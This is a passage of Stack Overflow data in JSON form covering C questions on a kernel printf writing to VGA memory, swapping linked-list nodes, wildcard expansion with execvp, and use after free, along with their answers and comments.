"https://stackoverflow.com/users/8070732/programmerprogrammeriosan"}, "edited": false, "score": 0, "creation_date": 1499278089, "post_id": 44906309, "comment_id": 76842227, "body": "void printf(char <i>str) {     unsigned short *VideoMemory = (unsigned short</i>)0xb8000;     for (int i = 0; str[i] != &#39;\\0&#39;; ++i)         VideoMemory[i] = (VideoMemory[i] &amp; 0xFF00) | str[i]; }  kmain() {\t \tprintf(&quot;Hello from kernel.&quot;); }"}], "tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": true, "score": 3, "last_activity_date": 1499281821, "last_edit_date": 1499281821, "creation_date": 1499172124, "answer_id": 44906309, "question_id": 44905772, "link": "https://stackoverflow.com/questions/44905772/how-can-i-make-a-printf-function-in-c-for-my-operating-system-without-stdio/44906309#44906309", "title": "How can I make a printf function in c for my operating system without stdio?", "body": "<p>You seem to target a real mode PC BIOS system.  Your definition for <code>VideoMemory</code> is incorrect. If your compiler uses 32-bit pointers in flat mode, try this:</p>\n\n<pre><code>void printf(char *str) {\n    unsigned short *VideoMemory = (unsigned short*)0xb8000UL;\n    for (int i = 0; str[i] != '\\0'; ++i)\n        VideoMemory[i] = (VideoMemory[i] &amp; 0xFF00) | str[i];\n}\n\nvoid kmain() {   \n    printf(\"Hello from kernel.\");\n}\n</code></pre>\n\n<p>Otherwise, with 16 bit ints and segmented pointers, you may need to use the <code>far</code> or <code>__far</code> keyword such as:</p>\n\n<pre><code>unsigned short far* VideoMemory = (unsigned short far*)0xb8000000UL;\n</code></pre>\n\n<p>Note that it is a bad idea to define your own version of <code>printf</code> with different semantics than the standard function.  It creates confusion among programmers and the compiler might perform incorrect optimizations, such as converting <code>printf</code> calls to something else.  Call this function <code>kputstr</code> until you can make it handle formatting with variable argument lists, at which time you will rename it <code>kprintf</code>.</p>\n"}], "owner": {"reputation": 21, "user_id": 8070732, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eee3b07232b93a91d1d938cd68ecbe0c?s=128&d=identicon&r=PG&f=1", "display_name": "ProgrammerProgrammerIOSAN", "link": "https://stackoverflow.com/users/8070732/programmerprogrammeriosan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 155, "favorite_count": 0, "closed_date": 1499191707, "accepted_answer_id": 44906309, "answer_count": 1, "score": -1, "last_activity_date": 1499281821, "creation_date": 1499170639, "last_edit_date": 1499170977, "question_id": 44905772, "link": "https://stackoverflow.com/questions/44905772/how-can-i-make-a-printf-function-in-c-for-my-operating-system-without-stdio", "closed_reason": "Not suitable for this site", "title": "How can I make a printf function in c for my operating system without stdio?", "body": "<p>I wanted to make a basic operating system in c and I wanted to make a printf\nfunction. </p>\n\n<pre><code>void printf(char* str){\n    (unsigned short*) VideoMemory = (unsigned short*) 0xb800;\n    for(int i = 0; str[i] != '\\0'; ++i)\n        VideoMemory[i] = (VideoMemory[i] &amp; 0xFF00) | str[i];\n}\n\nkmain()\n{   \n    printf(\"Hello from kernel.\");\n}\n</code></pre>\n\n<p>But when I compile it I get this error: </p>\n\n<p>kernel.c:3:20: error: \u2018VideoMemory\u2019 undeclared (first use in this function)\n  (unsigned short*) VideoMemory = (unsigned short*) 0xb800;</p>\n"}, {"tags": ["c", "data-structures", "linked-list", "swap", "singly-linked-list"], "comments": [{"owner": {"reputation": 3940, "user_id": 2830116, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/SnjA4.jpg?s=128&g=1", "display_name": "Rohan Kumar", "link": "https://stackoverflow.com/users/2830116/rohan-kumar"}, "edited": false, "score": 0, "creation_date": 1499167525, "post_id": 44904628, "comment_id": 76786164, "body": "Try running on a debugger with some sample test cases."}, {"owner": {"reputation": 681, "user_id": 5994074, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dzK2Q.jpg?s=128&g=1", "display_name": "GAURANG VYAS", "link": "https://stackoverflow.com/users/5994074/gaurang-vyas"}, "edited": false, "score": 0, "creation_date": 1499167804, "post_id": 44904628, "comment_id": 76786369, "body": "If you are allowed to swap data then you can do that to avoid errors due to pointer manipulation."}, {"owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "edited": false, "score": 0, "creation_date": 1499168836, "post_id": 44904628, "comment_id": 76787142, "body": "@ilz0R The reference you pointed is useless for this question."}, {"owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "edited": false, "score": 0, "creation_date": 1499168972, "post_id": 44904628, "comment_id": 76787265, "body": "@Bhart Mittal  The function has undefined behavior because temp1 or temp2 can be equal to NULL."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1499180100, "post_id": 44904628, "comment_id": 76794655, "body": "Although one of the duplicate questions is tagged C++, the operational code is the same as C code (but the swapping function does contain a <code>cout &lt;&lt; \u2026 &lt;&lt; endl;</code> line, which is pure C++).  That covers the more general case; the pure C question covers a more limited case of swapping adjacent nodes.  Note that one of the suggestions in the C++ question is to swap payloads instead of swapping the pointers around \u2014 that has great merit since it can be done without needing to know anything about the nodes prior to the swapped nodes."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "edited": false, "score": 0, "creation_date": 1499192509, "post_id": 44904628, "comment_id": 76800579, "body": "Mr @VladfromMoscow: Why is this remotely different from the questions I closed this as a duplicate of?"}, {"owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1499198749, "post_id": 44904628, "comment_id": 76803109, "body": "@JonathanLeffler I was not satisfied with the answers in the provided references.:) One of the references if I am not mistaken is about doubly-linked lists and other does not contain a solution."}], "answers": [{"tags": [], "owner": {"reputation": 1199, "user_id": 6666791, "user_type": "registered", "accept_rate": 90, "profile_image": "https://lh3.googleusercontent.com/-W3_hsDW1xtE/AAAAAAAAAAI/AAAAAAAAAEo/y7sVkMzv2kA/photo.jpg?sz=128", "display_name": "Nikolai Shalakin", "link": "https://stackoverflow.com/users/6666791/nikolai-shalakin"}, "is_accepted": false, "score": 1, "last_activity_date": 1499174992, "creation_date": 1499174992, "answer_id": 44907364, "question_id": 44904628, "link": "https://stackoverflow.com/questions/44904628/swapping-nodes-in-linked-list/44907364#44907364", "title": "Swapping nodes in linked list", "body": "<p>You should rewrite you <code>swapNodes</code> function a bit:</p>\n\n<pre><code>void swapNodes(struct Node** headr, int key1, int key2)\n{\n    struct Node* temp1 = *headr;\n    struct Node* temp2 = *headr;\n\n    if(key1==key2)\n        return;\n\n    struct Node* prev1=NULL;\n    while(temp1 &amp;&amp; temp1-&gt;data!=key1)\n    {\n        prev1=temp1;\n        temp1=temp1-&gt;next;\n    }\n    struct Node* prev2=NULL;\n    while(temp2 &amp;&amp; temp2-&gt;data!=key2)\n    {\n        prev2=temp2;\n        temp2=temp2-&gt;next;\n    }\n\n    if(temp1==NULL || temp1==NULL)\n        return;\n\n    // temp1 is a head\n    if (prev1 == NULL) {\n        *headr = temp2;\n    } else {\n        prev1-&gt;next = temp2;\n    }\n\n    // temp2 is a head\n    if (prev2 == NULL) {\n        *headr = temp1;\n    } else {\n        prev2-&gt;next = temp1;\n    }\n\n    struct Node *buff = temp2-&gt;next;\n    temp2-&gt;next = temp1-&gt;next;\n    temp1-&gt;next = buff;\n}\n</code></pre>\n\n<p>As you can see you don't need <code>next1</code> and <code>next2</code> pointers. But you must check if <code>temp1</code> or <code>temp2</code> is a head: it is a special case when you need to replace head with another node. The rest is trivial - just swap nodes via buffer node.</p>\n"}, {"tags": [], "owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "is_accepted": false, "score": 2, "last_activity_date": 1499185024, "last_edit_date": 1499185024, "creation_date": 1499176744, "answer_id": 44907942, "question_id": 44904628, "link": "https://stackoverflow.com/questions/44904628/swapping-nodes-in-linked-list/44907942#44907942", "title": "Swapping nodes in linked list", "body": "<p>The function has undefined behavior because it does not take into account that for example <code>headr</code> can be equal to <code>NULL</code> or <code>prev1</code> and <code>prev2</code> can be equal to <code>NULL</code>.</p>\n\n<p>It would be good to write one more function that finds the node that corresponds to the given data. </p>\n\n<p>Nevertheless the function <code>swapNodes</code> can be written the following way. It finds nodes to be swapped and then swaps pointers to the nodes and their data members <code>next</code>.</p>\n\n<p>Here you are</p>\n\n<pre><code>void swap( struct Node **first, struct Node **second )\n{\n    struct Node *tmp = *first;\n    *first = *second;\n    *second = tmp;\n}\n\nvoid swapNodes( struct Node **headr, int key1, int key2 )\n{\n    if ( key1 == key2 ) return;\n\n    struct Node **first = headr;\n\n    while ( *first &amp;&amp; ( *first )-&gt;data != key1 ) first = &amp;( *first )-&gt;next;\n\n    if ( *first == NULL ) return;\n\n    struct Node **second = headr;\n\n    while ( *second &amp;&amp; ( *second )-&gt;data != key2 ) second = &amp;( *second )-&gt;next;\n\n    if ( *second == NULL ) return;\n\n    swap( first, second );\n    swap( &amp;( *first )-&gt;next, &amp;( *second )-&gt;next );\n}\n</code></pre>\n\n<p>Here is a demonstrative program.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct Node\n{\n    int data;\n    struct Node *next;\n};\n\nvoid push(struct Node** head_ref, int new_data)\n{\n    struct Node* new_node =\n        (struct Node*) malloc(sizeof(struct Node));\n\n    new_node-&gt;data  = new_data;\n    new_node-&gt;next = (*head_ref);\n    (*head_ref)    = new_node;\n}\n\nvoid printList(struct Node *node)\n{\n    while(node != NULL)\n    {\n        printf(\"%d \", node-&gt;data);\n        node = node-&gt;next;\n    }\n}\n\nvoid swap( struct Node **first, struct Node **second )\n{\n    struct Node *tmp = *first;\n    *first = *second;\n    *second = tmp;\n}\n\nvoid swapNodes( struct Node **headr, int key1, int key2 )\n{\n    if ( key1 == key2 ) return;\n\n    struct Node **first = headr;\n\n    while ( *first &amp;&amp; ( *first )-&gt;data != key1 ) first = &amp;( *first )-&gt;next;\n\n    if ( *first == NULL ) return;\n\n    struct Node **second = headr;\n\n    while ( *second &amp;&amp; ( *second )-&gt;data != key2 ) second = &amp;( *second )-&gt;next;\n\n    if ( *second == NULL ) return;\n\n    swap( first, second );\n    swap( &amp;( *first )-&gt;next, &amp;( *second )-&gt;next );\n}\n\nint main( void ) \n{\n    struct Node *start = NULL;\n\n    push(&amp;start, 7);\n    push(&amp;start, 6);\n    push(&amp;start, 5);\n    push(&amp;start, 4);\n    push(&amp;start, 3);\n    push(&amp;start, 2);\n    push(&amp;start, 1);\n\n    printf(\"\\n Linked list before calling swapNodes() \");\n    printList(start);\n\n    swapNodes(&amp;start, 4, 3);\n\n    printf(\"\\n Linked list after  calling swapNodes() \");\n    printList(start);\n\n    return 0;\n}\n</code></pre>\n\n<p>Its output is</p>\n\n<pre><code> Linked list before calling swapNodes() 1 2 3 4 5 6 7 \n Linked list after  calling swapNodes() 1 2 4 3 5 6 7 \n</code></pre>\n\n<p>In fact the function <code>swapNodes</code> as it is written (without a separate function that finds nodes for a given data) does two things: it 1) finds two nodes and it 2) swaps them. Searching of the nodes can be unsuccessful. So the function should report to the user whether nodes were swapped. In this case it is desirable to declare the function as having return type <code>int</code>.  </p>\n\n<p>For example</p>\n\n<pre><code>int swapNodes( struct Node **headr, int key1, int key2 )\n{\n    int success = key1 != key2;\n\n    if ( success )\n    {        \n        struct Node **first  = headr;\n        struct Node **second = headr;\n\n        while ( *first &amp;&amp; ( *first )-&gt;data != key1 ) first = &amp;( *first )-&gt;next;\n\n        success = *first != NULL;\n\n        if ( success )\n        {            \n            while ( *second &amp;&amp; ( *second )-&gt;data != key2 ) second = &amp;( *second )-&gt;next;\n\n            success = *second != NULL;\n        }\n\n        if ( success )\n        {            \n            swap( first, second );\n            swap( &amp;( *first )-&gt;next, &amp;( *second )-&gt;next );\n        }\n    }\n\n    return success;\n}\n</code></pre>\n\n<p>If to write a separate function that searches a node as it was mentioned above then the function that swaps nodes will look more clear and simpler.</p>\n\n<p>For example</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct Node\n{\n    int data;\n    struct Node *next;\n};\n\nvoid push(struct Node** head_ref, int new_data)\n{\n    struct Node* new_node =\n        (struct Node*) malloc(sizeof(struct Node));\n\n    new_node-&gt;data  = new_data;\n    new_node-&gt;next = (*head_ref);\n    (*head_ref)    = new_node;\n}\n\nvoid printList(struct Node *node)\n{\n    while(node != NULL)\n    {\n        printf(\"%d \", node-&gt;data);\n        node = node-&gt;next;\n    }\n}\n\nvoid swap( struct Node **first, struct Node **second )\n{\n    struct Node *tmp = *first;\n    *first = *second;\n    *second = tmp;\n}\n\nstruct Node ** find( struct Node **headr, int data )\n{\n    while ( *headr &amp;&amp; ( *headr )-&gt;data != data ) headr = &amp;( *headr )-&gt;next;\n\n    return headr;\n}\n\nvoid swapNodes( struct Node **first, struct Node **second )\n{\n    swap( first, second );\n    swap( &amp;( *first )-&gt;next, &amp;( *second )-&gt;next );\n}\n\nint main( void ) \n{\n    struct Node *start = NULL;\n\n    push(&amp;start, 7);\n    push(&amp;start, 6);\n    push(&amp;start, 5);\n    push(&amp;start, 4);\n    push(&amp;start, 3);\n    push(&amp;start, 2);\n    push(&amp;start, 1);\n\n    printf(\"\\n Linked list before calling swapNodes() \");\n    printList(start);\n\n    struct Node **first;\n    struct Node **second;\n\n    if ( ( first = find( &amp;start, 4 ) ) &amp;&amp; ( second = find( &amp;start, 3 ) ) )  swapNodes( first, second );\n\n    printf(\"\\n Linked list after  calling swapNodes() \");\n    printList(start);\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 47, "user_id": 5064233, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/52892bf092aa792d7dc8adaaaf4017ff?s=128&d=identicon&r=PG&f=1", "display_name": "Bhart Kumar", "link": "https://stackoverflow.com/users/5064233/bhart-kumar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 7161, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1499185024, "creation_date": 1499167264, "last_edit_date": 1499180103, "question_id": 44904628, "link": "https://stackoverflow.com/questions/44904628/swapping-nodes-in-linked-list", "title": "Swapping nodes in linked list", "body": "<p>I tried to make function(swapNodes) for swapping nodes in linked list.\nHere i stored previous and next addresses of nodes which are to be swapped.\nBut my code stucked in infinite loop.  <br/> \n<br/>\nCan this code be made as working one or it is a wrong approach?</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n struct Node\n{\n    int data;\n    struct Node *next;\n};\nvoid push(struct Node** head_ref, int new_data)\n{\n    struct Node* new_node =\n        (struct Node*) malloc(sizeof(struct Node));\n\n    new_node-&gt;data  = new_data;\n    new_node-&gt;next = (*head_ref);\n    (*head_ref)    = new_node;\n}\n\n\nvoid printList(struct Node *node)\n{\n    while(node != NULL)\n    {\n        printf(\"%d \", node-&gt;data);\n        node = node-&gt;next;\n    }\n}\n\nvoid swapNodes(struct Node** headr,int key1,int key2)\n{\n    struct Node* temp1 = *headr;\n    struct Node* temp2 = *headr;\n\n    if(key1 == key2)\n    return;\n\n    struct Node* prev1 =NULL;\n    struct Node* next1 =temp1;\n    while(temp1-&gt;data !=key1 &amp;&amp; next1 !=NULL)\n    {\n    prev1 =temp1;\n    temp1 =temp1-&gt;next;\n    next1 =temp1-&gt;next;\n    }\n    struct Node* prev2 =NULL;\n    struct Node* next2 =temp2;\n    while(temp2-&gt;data !=key2 &amp;&amp; next2 !=NULL)\n    {\n    prev2 =temp2;\n    temp2 =temp2-&gt;next;\n    next2 =temp2-&gt;next;\n    }\n    if(next1 == NULL||next2 == NULL)\n    return;\n\n    prev1-&gt;next =temp2;\n    temp2-&gt;next =next1;\n    prev2-&gt;next =temp1;\n    temp1-&gt;next =next2;\n}\nint main()\n{\n    struct Node *start = NULL;\n\n    push(&amp;start, 7);\n    push(&amp;start, 6);\n    push(&amp;start, 5);\n    push(&amp;start, 4);\n    push(&amp;start, 3);\n    push(&amp;start, 2);\n    push(&amp;start, 1);\n\n    printf(\"\\n Linked list before calling swapNodes() \");\n    printList(start);\n\n    swapNodes(&amp;start, 4, 3);\n\n    printf(\"\\n Linked list after calling swapNodes() \");\n    printList(start);\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "linux", "fork", "ipc", "execvp"], "comments": [{"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 2, "creation_date": 1499167293, "post_id": 44904541, "comment_id": 76785990, "body": "If you need shell-globbing, you can use <code>system()</code> instead"}, {"owner": {"reputation": 82953, "user_id": 608639, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/aPIhh.jpg?s=128&g=1", "display_name": "jww", "link": "https://stackoverflow.com/users/608639/jww"}, "edited": false, "score": 0, "creation_date": 1499167770, "post_id": 44904541, "comment_id": 76786336, "body": "Also see <a href=\"https://stackoverflow.com/q/27541910/608639\">How to use execvp()</a>, <a href=\"https://stackoverflow.com/q/38972164/608639\">Directory listing with wildcards in C</a> and <a href=\"https://stackoverflow.com/q/10464646/608639\">Regex for directory and file listing in C</a>."}, {"owner": {"reputation": 82953, "user_id": 608639, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/aPIhh.jpg?s=128&g=1", "display_name": "jww", "link": "https://stackoverflow.com/users/608639/jww"}, "edited": false, "score": 0, "creation_date": 1499202753, "post_id": 44904541, "comment_id": 76804551, "body": "@BhargavRao - I attempted to vote to undelete Abhijit&#39;s answer but I cannot due to your status. Please forgive me for challenging your decision, but I think Abhijit&#39;s answer should stand. It has the complete code available, and it credits&#39;s SomeProgrammerDude&#39;s answer. I think its better than SomeProgrammerDude answer because SPD&#39;s answer lacks the code."}, {"owner": {"reputation": 127, "user_id": 4417215, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-B-kp-luVv9E/AAAAAAAAAAI/AAAAAAAAAEU/sqS40YlLCr4/photo.jpg?sz=128", "display_name": "Abhijit Sahu", "link": "https://stackoverflow.com/users/4417215/abhijit-sahu"}, "edited": false, "score": 0, "creation_date": 1499234599, "post_id": 44904541, "comment_id": 76812098, "body": "I strongly believe stack-overflow gives complete information as much as possible. BhargavRao - I am completely agree with you.The code which i have provided is the &quot;SIMPLE USAGE of execvp() and glob()&quot; to resolve the issue and complete credit of the ans goes to SomeProgrammerDude&#39;s inputs. As per SomeProgrammerDude&#39;s point fork and exec should be used , which i am not denying it. By the way i already made that comment. As per my opinion the code which i have provided &quot;should not be deleted&quot; as it convey the basic functionality of the same to achieve output. Please correct me if i am wrong."}], "answers": [{"comments": [{"owner": {"reputation": 127, "user_id": 4417215, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-B-kp-luVv9E/AAAAAAAAAAI/AAAAAAAAAEU/sqS40YlLCr4/photo.jpg?sz=128", "display_name": "Abhijit Sahu", "link": "https://stackoverflow.com/users/4417215/abhijit-sahu"}, "edited": false, "score": 0, "creation_date": 1499167748, "post_id": 44904614, "comment_id": 76786320, "body": "Thanks for the quick response. Yes , through shell it&#39;s working fine as expected. But ,Sorry i am using busybox without shell. But how to achieve in execvp() system call itself?Is there any possibility to achieve it?"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "reply_to_user": {"reputation": 127, "user_id": 4417215, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-B-kp-luVv9E/AAAAAAAAAAI/AAAAAAAAAEU/sqS40YlLCr4/photo.jpg?sz=128", "display_name": "Abhijit Sahu", "link": "https://stackoverflow.com/users/4417215/abhijit-sahu"}, "edited": false, "score": 0, "creation_date": 1499168389, "post_id": 44904614, "comment_id": 76786785, "body": "@AbhijitSahu If you want to use <a href=\"https://en.wikipedia.org/wiki/Glob_(programming)\" rel=\"nofollow noreferrer\"><i>globbing</i></a> wildcards, you either have to use a shell, or use the <a href=\"http://man7.org/linux/man-pages/man3/glob.3.html\" rel=\"nofollow noreferrer\"><code>glob</code></a> function and multiple <code>cp</code> commands (one for each match)."}, {"owner": {"reputation": 127, "user_id": 4417215, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-B-kp-luVv9E/AAAAAAAAAAI/AAAAAAAAAEU/sqS40YlLCr4/photo.jpg?sz=128", "display_name": "Abhijit Sahu", "link": "https://stackoverflow.com/users/4417215/abhijit-sahu"}, "edited": false, "score": 0, "creation_date": 1499173093, "post_id": 44904614, "comment_id": 76790285, "body": "Thank you very much for the inputs - &quot;Some programmer dude&quot;. I have updated the code at answer comment. Thank you again for the help."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "reply_to_user": {"reputation": 127, "user_id": 4417215, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-B-kp-luVv9E/AAAAAAAAAAI/AAAAAAAAAEU/sqS40YlLCr4/photo.jpg?sz=128", "display_name": "Abhijit Sahu", "link": "https://stackoverflow.com/users/4417215/abhijit-sahu"}, "edited": false, "score": 0, "creation_date": 1499173238, "post_id": 44904614, "comment_id": 76790391, "body": "@AbhijitSahu You do know what the <a href=\"http://man7.org/linux/man-pages/man3/exec.3.html\" rel=\"nofollow noreferrer\"><code>exec</code></a> functions <i>do</i>? That they <i>replace</i> your program with the one you try to <code>exec</code>? The <code>exec</code> function only return on error. Perhaps you should also learn about <a href=\"http://man7.org/linux/man-pages/man2/fork.2.html\" rel=\"nofollow noreferrer\"><code>fork</code></a> and <a href=\"https://en.wikipedia.org/wiki/Fork%E2%80%93exec\" rel=\"nofollow noreferrer\">the fork-exec idiom</a>."}, {"owner": {"reputation": 127, "user_id": 4417215, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-B-kp-luVv9E/AAAAAAAAAAI/AAAAAAAAAEU/sqS40YlLCr4/photo.jpg?sz=128", "display_name": "Abhijit Sahu", "link": "https://stackoverflow.com/users/4417215/abhijit-sahu"}, "edited": false, "score": 0, "creation_date": 1499173748, "post_id": 44904614, "comment_id": 76790701, "body": "Yes , i know it very well. Thanks for the clarifications! Actually i am using fork() , sigchld_hdl handler with  execvp() in my code-base. Instead of writing fork() with whole long prog here i had raised the questions with simple  execvp() example - just to convey this wild character issue. Thanks."}], "tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": true, "score": 3, "last_activity_date": 1499167206, "creation_date": 1499167206, "answer_id": 44904614, "question_id": 44904541, "link": "https://stackoverflow.com/questions/44904541/wildcard-not-expanded-in-recursive-cp-using-execvp/44904614#44904614", "title": "Wildcard not expanded in recursive cp using execvp()", "body": "<p>The asterisk pattern <code>*</code> is expanded by the <em>shell</em> and not by the <code>cp</code> command itself.</p>\n\n<p>You could make it work if you run the <code>cp</code> command through a shell, either by invoking a shell with the <code>-c</code> option through <code>exec</code> or by using the <a href=\"http://man7.org/linux/man-pages/man3/system.3.html\" rel=\"nofollow noreferrer\"><code>system</code></a> function instead of <code>exec</code>.</p>\n"}], "owner": {"reputation": 127, "user_id": 4417215, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-B-kp-luVv9E/AAAAAAAAAAI/AAAAAAAAAEU/sqS40YlLCr4/photo.jpg?sz=128", "display_name": "Abhijit Sahu", "link": "https://stackoverflow.com/users/4417215/abhijit-sahu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 507, "favorite_count": 0, "accepted_answer_id": 44904614, "answer_count": 1, "score": 0, "last_activity_date": 1499204255, "creation_date": 1499167027, "last_edit_date": 1499204255, "question_id": 44904541, "link": "https://stackoverflow.com/questions/44904541/wildcard-not-expanded-in-recursive-cp-using-execvp", "title": "Wildcard not expanded in recursive cp using execvp()", "body": "<p>Though there are multiple files under path \"/home/abhijit/Documents/LINUX/editor/\" , but I am not getting desired output in \"temp\" (which should copied all files from editor folder) folder instead output is coming error as : <strong>\"cp: cannot stat \u2018/home/abhijit/Documents/LINUX/editor/*\u2019: No such file or directory\"</strong>. </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nint main( void )\n{\n    char* argv1[10] = { \"cp\", \"-rf\", \"/home/abhijit/Documents/LINUX/editor/*\", \"/home/abhijit/Documents/LINUX/temp\", 0 };\n    execvp( argv1[0], argv1 );\n}\n</code></pre>\n\n<p>But if i say as below , it works fine.</p>\n\n<pre><code> char* argv1[MAX_ARGS] = { \"cp\", \"-rf\", \"/home/abhijit/Documents/LINUX/editor/\", \"/home/abhijit/Documents/LINUX/temp\", 0 };\n</code></pre>\n"}, {"tags": ["c", "malloc", "free"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 5, "creation_date": 1499165481, "post_id": 44903955, "comment_id": 76784742, "body": "After you call <code>free</code> you no longer own the memory pointed to by <code>m</code>. Dereferencing it will lead to <i>undefined behavior</i>. And if you have undefined behavior then your program is <i>ill-formed</i> and invalid."}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 1, "creation_date": 1499165607, "post_id": 44903955, "comment_id": 76784820, "body": "Also, you need to cast <code>m</code> to <code>void *</code> to avoid undefined behavior."}, {"owner": {"reputation": 2802, "user_id": 3661207, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/tzrwF.jpg?s=128&g=1", "display_name": "manatttta", "link": "https://stackoverflow.com/users/3661207/manatttta"}, "edited": false, "score": 0, "creation_date": 1499165628, "post_id": 44903955, "comment_id": 76784835, "body": "What do you mean &quot;the value of the memory adress is always 0&quot;? Nothing is 0 here"}, {"owner": {"reputation": 8510, "user_id": 1292918, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/44cdb725bf1a393149554bae7f5f9d46?s=128&d=identicon&r=PG", "display_name": "Toby", "link": "https://stackoverflow.com/users/1292918/toby"}, "reply_to_user": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 0, "creation_date": 1499165676, "post_id": 44903955, "comment_id": 76784876, "body": "You should not cast the return value of <code>malloc()</code> at all: <a href=\"https://stackoverflow.com/questions/605845/do-i-cast-the-result-of-malloc\" title=\"do i cast the result of malloc\">stackoverflow.com/questions/605845/&hellip;</a>, note @DavidBowling and OP"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", 